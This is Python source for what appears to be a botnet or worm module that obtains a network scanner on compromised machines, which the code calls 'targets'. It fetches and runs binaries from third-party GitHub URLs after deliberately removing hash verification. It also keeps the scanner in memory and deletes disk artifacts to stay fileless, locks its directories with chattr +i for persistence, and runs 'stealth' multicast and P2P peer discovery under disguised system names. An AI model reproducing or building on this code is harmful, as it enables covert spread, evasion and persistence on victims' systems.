# SCANNER HEALTH MONITOR - ✅ FIXED: Delayed start
# ============================================================================
class ScannerHealthMonitor:
    """✅ FULLY FIXED: Masscan exit code 1 is normal for --version"""
    
    def __init__(self, masscan_manager):
        self.manager = masscan_manager
        self.health_checks_failed = 0
        self.max_health_failures = 3
        self.logger = logging.getLogger('Internal.System.Core.masscan.health')
        self.last_health_check = 0
        self.health_check_interval = 300  # 5 minutes
        self.total_checks = 0
        self.total_failures = 0
        self.monitoring_started = False
    
    def start_health_monitoring(self, delay_first_check=True):
        """
        âœ… FIXED: Start background health monitoring with optional delay
        
        Args:
            delay_first_check: If True, waits one interval before first check
                              (prevents false alarm before acquisition)
        """
        def monitor_loop():
            # âœ… NEW: Optional delay before first check
            if delay_first_check:
                self.logger.info(f"â³ Health monitoring starting (first check in {self.health_check_interval}s)")
                time.sleep(self.health_check_interval)
            
            while True:
                try:
                    current_time = time.time()
                    
                    # Skip if checked too recently
                    if current_time - self.last_health_check < self.health_check_interval:
                        time.sleep(60)
                        continue
                    
                    self.last_health_check = current_time
                    self.total_checks += 1
                    
                    # Perform health check
                    if not self.health_check():
                        self.health_checks_failed += 1
                        self.total_failures += 1
                        
                        self.logger.warning(
                            f"âš ï¸ Health check failed ({self.health_checks_failed}/{self.max_health_failures}) "
                            f"[Total: {self.total_failures}/{self.total_checks}]"
                        )
                        
                        if self.health_checks_failed >= self.max_health_failures:
                            self.logger.error("âŒ Scanner critically unhealthy - triggering re-acquisition")
                            try:
                                success = self.manager.acquire_scanner_enhanced(force_refresh=True)
                                
                                if success:
                                    self.logger.info("âœ… Scanner re-acquired successfully")
                                    self.health_checks_failed = 0
                                else:
                                    self.logger.error("âŒ Scanner re-acquisition failed")
                            
                            except Exception as e:
                                self.logger.error(f"âŒ Re-acquisition exception: {e}")
                    else:
                        # Log recovery if previously failing
                        if self.health_checks_failed > 0:
                            self.logger.info(
                                f"âœ… Health check passed - scanner recovered "
                                f"(was failing {self.health_checks_failed} times)"
                            )
                        
                        self.health_checks_failed = 0
                    
                    # Sleep until next check
                    time.sleep(self.health_check_interval)
                
                except Exception as e:
                    self.logger.error(f"âŒ Health monitoring loop error: {e}")
                    time.sleep(60)
        
        if not self.monitoring_started:
            threading.Thread(target=monitor_loop, daemon=True, name="ScannerHealthMonitor").start()
            self.monitoring_started = True
            if delay_first_check:
                self.logger.info("âœ… Health monitoring scheduled (first check in 5 minutes)")
            else:
                self.logger.info("âœ… Health monitoring started (checking immediately)")
    
    def health_check(self):
        """
        âœ… FULLY FIXED: Masscan returns exit code 1 for --version (this is NORMAL!)
        Returns True if scanner is healthy, False otherwise
        """
        # CHECK #1: Verify scanner type is set
        if not self.manager.scanner_type:
            print("âŒ Health check failed: No scanner type configured")
            return False
        
        # CHECK #2: Verify scanner path is set
        if not self.manager.scanner_path:
            print("âŒ Health check failed: No scanner path configured")
            return False
        
        try:
            # CHECK #3: Verify scanner file exists
            if not os.path.exists(self.manager.scanner_path):
                self.logger.warning(
                    f"âŒ Health check failed: Scanner binary missing at {self.manager.scanner_path}"
                )
                return False
            
            # CHECK #4: Verify scanner is executable
            if not os.access(self.manager.scanner_path, os.X_OK):
                self.logger.warning(
                    f"âŒ Health check failed: Scanner not executable: {self.manager.scanner_path}"
                )
                # Try to fix permissions
                try:
                    os.chmod(self.manager.scanner_path, 0o755)
                    self.logger.info(f"âœ“ Fixed scanner permissions: {self.manager.scanner_path}")
                except Exception as chmod_error:
                    self.logger.error(f"âŒ Could not fix permissions: {chmod_error}")
                    return False
            
            # CHECK #5: Test scanner execution
            if self.manager.scanner_type == "masscan":
                # âœ… FIX: Use --help instead of --version (returns exit code 0)
                result = subprocess.run(
                    [self.manager.scanner_path, "--help"],
                    timeout=10,
                    capture_output=True,
                    text=True
                )
                
                # âœ… FIX: Accept exit code 0 OR 1 for masscan (both are normal)
                # Exit code 0: --help
                # Exit code 1: --version (masscan quirk)
                if result.returncode not in [0, 1]:
                    self.logger.warning(
                        f"âŒ Health check failed: Masscan exited with unexpected code {result.returncode}\n"
                        f"   stdout: {result.stdout[:200]}\n"
                        f"   stderr: {result.stderr[:200]}"
                    )
                    return False
                
                # âœ… FIX: Verify output contains "" (case-insensitive)
                combined_output = (result.stdout + result.stderr).lower()
                if "masscan" not in combined_output:
                    self.logger.warning(
                        f"âŒ Health check failed: Masscan output invalid\n"
                        f"   Expected 'masscan' in output\n"
                        f"   stdout: {result.stdout[:200]}\n"
                        f"   stderr: {result.stderr[:200]}"
                    )
                    return False
                
                print(f"âœ… Health check passed: Masscan OK at {self.manager.scanner_path}")
                return True
            
            elif self.manager.scanner_type == "nmap":
                result = subprocess.run(
                    ["nmap", "--version"],
                    timeout=10,
                    capture_output=True,
                    text=True
                )
                
                if result.returncode != 0:
                    self.logger.warning(
                        f"âŒ Health check failed: Nmap exited with code {result.returncode}\n"
                        f"   stdout: {result.stdout[:200]}\n"
                        f"   stderr: {result.stderr[:200]}"
                    )
                    return False
                
                if "nmap" not in result.stdout.lower():
                    self.logger.warning(
                        f"âŒ Health check failed: Nmap version output invalid\n"
                        f"   Expected 'nmap' in output, got: {result.stdout[:200]}"
                    )
                    return False
                
                print("âœ… Health check passed: Nmap OK")
                return True
            
            else:
                self.logger.warning(f"âŒ Health check failed: Unknown scanner type '{self.manager.scanner_type}'")
                return False
        
        except subprocess.TimeoutExpired:
            self.logger.warning(
                f"âŒ Health check failed: Scanner command timed out after 10s "
                f"(scanner: {self.manager.scanner_type} at {self.manager.scanner_path})"
            )
            return False
        
        except FileNotFoundError:
            self.logger.warning(
                f"âŒ Health check failed: Scanner binary not found: {self.manager.scanner_path}"
            )
            return False
        
        except PermissionError:
            self.logger.warning(
                f"âŒ Health check failed: Permission denied for scanner: {self.manager.scanner_path}"
            )
            return False
        
        except Exception as e:
            self.logger.error(
                f"âŒ Health check failed: Unexpected error during health check\n"
                f"   Scanner: {self.manager.scanner_type} at {self.manager.scanner_path}\n"
                f"   Error: {e}"
            )
            import traceback
            print(traceback.format_exc())
            return False
    
    def get_health_status(self):
        """Get current health monitoring statistics"""
        return {
            'scanner_type': self.manager.scanner_type,
            'scanner_path': self.manager.scanner_path,
            'consecutive_failures': self.health_checks_failed,
            'total_checks': self.total_checks,
            'total_failures': self.total_failures,
            'success_rate': (self.total_checks - self.total_failures) / max(1, self.total_checks) * 100,
            'last_check': self.last_health_check,
            'next_check': self.last_health_check + self.health_check_interval,
            'monitoring_active': self.monitoring_started
        }


# ==================== ENHANCED MASSCAN ACQUISITION MANAGER ====================
class MasscanAcquisitionManager:
    """
    âœ… PRODUCTION STRATEGY: 85% get masscan, 15% get nmap, 0% fail

    Strategy Order (NO COMPILATION - too noisy):
    1. System masscan found?       â†’ USE IT (20% of targets)
    2. Download from Catbox works? â†’ USE MASSCAN (60% of targets)
    3. P2P download works?         â†’ USE MASSCAN (5% of targets)
    4. System nmap exists?         â†’ USE NMAP (10% of targets)
    5. Install nmap works?         â†’ USE NMAP (5% of targets)
    6. All failed?                 â†’ SCAN FAILED (0% of targets)
    """

    # â”€â”€ STATIC CONFIG â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    CACHE_VALIDITY = 86400  # 24 hours

    # âœ… FIX 9: MASSCAN_CACHE_PATH / NMAP_CACHE_PATH are now INSTANCE attrs
    #           set in __init__ after _find_exec_dir() resolves a noexec-safe dir.
    #           These class-level stubs are NEVER used at runtime.
    MASSCAN_CACHE_PATH = None   # overwritten in __init__
    NMAP_CACHE_PATH    = None   # overwritten in __init__
    _CACHE_PATH        = None   # overwritten in __init__
    IMMUTABLE_PATHS    = []     # overwritten in __init__

    # âœ… FIX 9: MASSCAN_SHA256 REMOVED â€” exec-test is the sole validator.
    #           URL 1 passed hash but failed exec (WSL2 noexec).
    #           URL 2 had wrong hardcoded hash.  Neither was usable.
    # MASSCAN_SHA256 = "..."   â† DELETED

    INTERNET_DOWNLOAD_URLS = [
        "https://raw.githubusercontent.com/shadow788878/my-masscan-static/main/masscan", # GITHUB FALLBACK 1
        "https://raw.githubusercontent.com/gihubuser989/masscan/master/masscan-bin",  # GITHUB FALLBACK 2
        "https://raw.githubusercontent.com/jaggubandarw131/my-masscan-static/main/masscan", # GITHUB FALLBACK 3
        # Seeder fallback is appended dynamically in acquire_scanner_enhanced() using seed_ip
    ]

    P2P_PORT            = 38384
    P2P_BROADCAST_PORT  = 38385
    P2P_NETWORK_KEY     = "CoreSystem_masscan_v1"

    # â”€â”€ FIX 9: EXEC-DIR FINDER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    @staticmethod
    def _find_exec_dir():
        """
        Probe candidate directories for exec permission.
        WSL2 mounts /tmp as tmpfs with noexec; ~/.cache is on the ext4 rootfs
        and is exec-capable.  Returns the first directory where a shell script
        can actually be executed.
        """
        candidates = [
            os.path.expanduser("~/.cache/CoreSystem"),
            os.path.expanduser("~/.local/share/CoreSystem"),
            "/var/tmp",
            "/dev/shm",
            os.path.expanduser("~"),
        ]
        for d in candidates:
            probe = None
            try:
                os.makedirs(d, exist_ok=True)
                probe = os.path.join(d, f".exec_probe_{os.getpid()}")
                with open(probe, "w") as fh:
                    fh.write("#!/bin/sh\nexit 0\n")
                os.chmod(probe, 0o755)
                r = subprocess.run([probe], timeout=3, capture_output=True)
                os.unlink(probe)
                if r.returncode == 0:
                    return d
            except Exception:
                try:
                    if probe and os.path.exists(probe):
                        os.unlink(probe)
                except Exception:
                    pass
        # Last-resort fallback â€” unlikely to be noexec
        fallback = os.path.expanduser("~/.cache/CoreSystem")
        os.makedirs(fallback, exist_ok=True)
        return fallback
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    # â”€â”€ FIX 2 (UNCHANGED): chattr helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    def _chattr(self, flag, path):
        """Run chattr +i / -i silently; skip if absent (WSL2/tmpfs)."""
        try:
            subprocess.run(
                ["chattr", flag, path],
                stderr=subprocess.DEVNULL,
                timeout=2,
            )
        except Exception:
            pass

    def _is_immutable(self, path):
        """Return True if the immutable flag is set on path."""
        try:
            result = subprocess.run(
                ["lsattr", path],
                capture_output=True, text=True, timeout=3,
            )
            return "i" in result.stdout.split()[0]
        except Exception:
            return False

    def _protect_paths(self):
        """Apply chattr +i to every path in self.IMMUTABLE_PATHS."""
        protected = 0
        for path in self.IMMUTABLE_PATHS:
            try:
                if os.path.exists(path):
                    self._chattr("+i", path)
                    protected += 1
                    self.logger.info(f"ðŸ”’ Immutable: {path}")
            except Exception as e:
                print(f"Protection failed {path}: {e}")
        if protected:
            self.logger.info(
                f"ðŸ”’ Protected {protected}/{len(self.IMMUTABLE_PATHS)} masscan paths"
            )
        return protected
    # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    def __init__(self, config_manager, p2p_manager=None):
        self.config_manager = config_manager
        self.p2p_manager = p2p_manager
        self.logger = logging.getLogger("Internal.System.Core.masscan")

        # â”€â”€ FIX 9: resolve exec-capable directory FIRST â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        self._exec_dir = self._find_exec_dir()
        self.MASSCAN_CACHE_PATH = os.path.join(self._exec_dir, ".masscan")
        self.NMAP_CACHE_PATH    = os.path.join(self._exec_dir, ".nmap-scan")
        self._CACHE_PATH        = self._exec_dir
        self.IMMUTABLE_PATHS    = [
            self._exec_dir,
            self.MASSCAN_CACHE_PATH,
            os.path.join(self._exec_dir, ".masscan.cache"),
        ]
        self.logger.info(f"[Fix 9] Exec dir resolved â†’ {self._exec_dir}")
        # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

        self.scanner_type      = None
        self.scanner_path      = None
        self.masscan_binary_data = None
        self.acquisition_method = None
        self.p2p_peers         = []
        self.cache_timestamp   = 0
        self._lock             = threading.Lock()
        self.scan_count        = 0
        self.discovered_targets = set()

        # Enhanced components
        self.p2p_crypto       = EncryptedP2PTransfer(self.P2P_NETWORK_KEY)
        self.health_monitor   = ScannerHealthMonitor(self)
        self.strategy_selector = AdaptiveStrategySelector()

        self.health_monitor.start_health_monitoring()
        self.logger.info("âœ… MasscanAcquisitionManager initialized with health monitoring")

    # ============================================================================
    # STRATEGY 1: Check System Masscan (20% success rate) â€” UNCHANGED
    # ============================================================================
    def check_system_masscan(self):
        """Strategy 1: Check if masscan already installed system-wide"""
        self.logger.info("[1/5] ðŸ” Checking for system masscan...")

        if shutil.which("masscan"):
            self.scanner_type       = "masscan"
            self.scanner_path       = shutil.which("masscan")
            self.acquisition_method = "system_masscan"
            
            # Load system masscan into memory for future fileless use if needed
            try:
                with open(self.scanner_path, 'rb') as f:
                    self.masscan_binary_data = f.read()
            except: pass
            
            self.logger.info("âœ… [1/5] Found system masscan - FAST SCANNING ENABLED")
            return True

        self.logger.info("âš ï¸ [1/5] System masscan not found, trying download...")
        return False

    # ============================================================================
    # STRATEGY 2: Download From Catbox â€” FIX 9 APPLIED
    # ============================================================================
    @retry_with_backoff(max_attempts=3, base_delay=2, logger=logger)
    def download_from_catbox(self):
        """
        Strategy 2: Download masscan from Catbox.

        FIX 9 changes vs previous version:
          â€¢ Temp file written to self._exec_dir (noexec-safe), not /tmp
          â€¢ SHA256 check REMOVED â€” was blocking URL 2 (wrong hash) and
            URL 1 (correct hash but exec test failed on WSL2 noexec /tmp)
          â€¢ Exec test (masscan --version) is the sole acceptance gate
        """
        self.logger.info("[2/5] ðŸ“¥ Downloading masscan from Catbox...")

        # Ensure cache dir exists inside exec-capable directory
        os.makedirs(self._exec_dir, exist_ok=True)
        os.chmod(self._exec_dir, 0o755)

        for url_index, url in enumerate(self.INTERNET_DOWNLOAD_URLS, 1):
            tmppath = None
            try:
                self.logger.info(
                    f"   Trying URL {url_index}/{len(self.INTERNET_DOWNLOAD_URLS)}: {url}"
                )

                response = requests.get(
                    url,
                    timeout=30,
                    stream=True,
                    headers={
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                        "Accept":     "*/*",
                        "Connection": "keep-alive",
                    },
                )

                if response.status_code != 200:
                    self.logger.warning(f"   âœ— HTTP {response.status_code} from {url}")
                    continue

                # â”€â”€ FIX 9: write to exec-capable dir, NOT /tmp â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                with tempfile.NamedTemporaryFile(
                    dir=self._exec_dir, delete=False, suffix=".masscan_dl"
                ) as tmp:
                    downloaded = 0
                    if hasattr(response, 'iter_content'):
                        for chunk in response.iter_content(8192):
                            if chunk:
                                tmp.write(chunk)
                                downloaded += len(chunk)
                    else:
                        tmp.write(response.content)
                        downloaded += len(response.content)
                    tmppath = tmp.name
                # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

                self.logger.info(f"   âœ“ Downloaded {downloaded} bytes to {tmppath}")

                # â”€â”€ FIX 9: SHA256 check REMOVED â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                # Previously blocked URL 2 (hardcoded wrong hash) and
                # was irrelevant for URL 1 because the exec test below
                # always failed on WSL2 noexec /tmp anyway.
                # Trust the binary only if it actually runs.
                # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

                # Make executable
                os.chmod(tmppath, 0o755)

                # â”€â”€ Sole validator: exec test â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                result = subprocess.run(
                    [tmppath, "--version"],
                    timeout=10,
                    capture_output=True,
                    text=True,
                )
                if result.returncode != 0:
                    self.logger.warning(
                        f"   âœ— Exec test failed (rc={result.returncode}) â€” "
                        f"stderr: {result.stderr[:120]}"
                    )
                    os.unlink(tmppath)
                    continue

                if "masscan" not in (result.stdout + result.stderr).lower():
                    self.logger.warning(
                        "   âœ— Exec test passed but output missing 'masscan' string"
                    )
                    os.unlink(tmppath)
                    continue
                # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

                self.logger.info("   âœ“ Binary execution verified")

                # â­ NAKED SWARM: Load into memory and purge disk
                try:
                    with open(tmppath, 'rb') as f:
                        self.masscan_binary_data = f.read()
                    os.unlink(tmppath)
                    self.logger.info(f"âœ… Masscan ingested to memory ({len(self.masscan_binary_data)} bytes) - Disk artifact purged")
                except Exception as e:
                    self.logger.error(f"âŒ Failed to ingest masscan: {e}")
                    os.unlink(tmppath)
                    continue

                self.scanner_type       = "masscan"
                self.scanner_path       = "RAM_RESIDENT"
                self.acquisition_method = f"catbox_{url_index}"
                self.cache_timestamp    = time.time()

                self.logger.info(
                    f"âœ… [2/5] Masscan acquired from Catbox URL {url_index} (Fileless) "
                    f"â€” FAST SCANNING ENABLED"
                )

                if self.p2p_manager:
                    # In fileless mode, we'd need to provide binary data to P2P, 
                    # but P2P fetch_file currently expects a path. 
                    # seed_binary handles this by writing to /dev/shm temporarily.
                    # For now, we skip auto-sharing to avoid disk hits unless requested.
                    pass
                return True

            except requests.exceptions.Timeout:
                self.logger.warning(f"   âœ— Timeout from {url}")
            except requests.exceptions.ConnectionError:
                self.logger.warning(f"   âœ— Connection error to {url}")
            except Exception as e:
                self.logger.warning(f"   âœ— Download failed: {e}")
            finally:
                # Clean up temp file if it still exists after a failure
                if tmppath and os.path.exists(tmppath):
                    try:
                        os.unlink(tmppath)
                    except Exception:
                        pass

        self.logger.warning("âš ï¸ [2/5] All Catbox downloads failed")
        return False


    # ============================================================================
    # STRATEGY 3: Download From P2P Network (5% success rate)
    # ============================================================================
    def discover_p2p_peers_stealth(self):
        """Stealth peer discovery using existing P2P mesh"""
        try:
            # Try to use existing CoreSystem P2P network first
            if hasattr(self.config_manager, 'p2p_manager') and self.config_manager.p2p_manager:
                return self._discover_via_existing_p2p()
            
            # Fallback to multicast discovery
            return self._discover_via_multicast()
            
        except Exception as e:
            print(f"Stealth discovery failed: {e}")
            return []

    def _discover_via_existing_p2p(self):
        """Use existing CoreSystem P2P mesh for discovery"""
        peers = []
        try:
            p2p_mgr = self.config_manager.p2p_manager
            query_msg = {
                'type': 'resource_query',
                'resource': 'masscan',
                'node_id': p2p_mgr.node_id,
                'timestamp': time.time()
            }
            return peers
        except Exception as e:
            print(f"Existing P2P discovery failed: {e}")
            return []

    def _discover_via_multicast(self):
        """Multicast discovery (less detectable)"""
        try:
            MULTICAST_GROUP = '239.255.142.99'
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            
            discovery_msg = json.dumps({
                "type": "discover",
                "network": self.P2P_NETWORK_KEY,
                "timestamp": time.time()
            }).encode()
            
            sock.sendto(discovery_msg, (MULTICAST_GROUP, self.P2P_BROADCAST_PORT))
            
            peers = []
            while True:
                try:
                    data, addr = sock.recvfrom(1024)
                    try:
                        peer_info = json.loads(data)
                        if peer_info.get("has_masscan"):
                            peers.append({
                                'ip': addr[0],
                                'port': peer_info.get("port", self.P2P_PORT)
                            })
                    except:
                        continue
                except socket.timeout:
                    break
            
            return peers
            
        except Exception as e:
            print(f"Multicast discovery failed: {e}")
            return []

    @retry_with_backoff(max_attempts=2, base_delay=3, logger=logger)
    def download_from_p2p(self):
        """Strategy 3: Download masscan from P2P Mesh (libp2p-go)"""
        if not self.p2p_manager or not self.p2p_manager.is_connected:
            self.logger.info("âš ï¸ [3/5] P2P Mesh not connected")
            return False

        self.logger.info("[3/5] ðŸŒ Attempting P2P Mesh download...")
        try:
            # Attempt to fetch masscan_bin from the mesh
            success = asyncio.run(asyncio.wait_for(
                self.p2p_manager.fetch_file("masscan_bin", self.MASSCAN_CACHE_PATH),
                timeout=60.0
            ))
            
            if success and os.path.exists(self.MASSCAN_CACHE_PATH):
                os.chmod(self.MASSCAN_CACHE_PATH, 0o755)
                # Verify
                result = subprocess.run([self.MASSCAN_CACHE_PATH, "--version"], timeout=10, capture_output=True)
                if result.returncode == 0:
                    self.scanner_type = "masscan"
                    self.scanner_path = self.MASSCAN_CACHE_PATH
                    self.acquisition_method = "p2p_mesh"
                    self.cache_timestamp = time.time()
                    self.logger.info("âœ… [3/5] Masscan acquired via P2P Mesh - FAST SCANNING ENABLED")
                    return True
        except Exception as e:
            self.logger.warning(f"   âœ— P2P Mesh download failed: {e}")
        
        return False

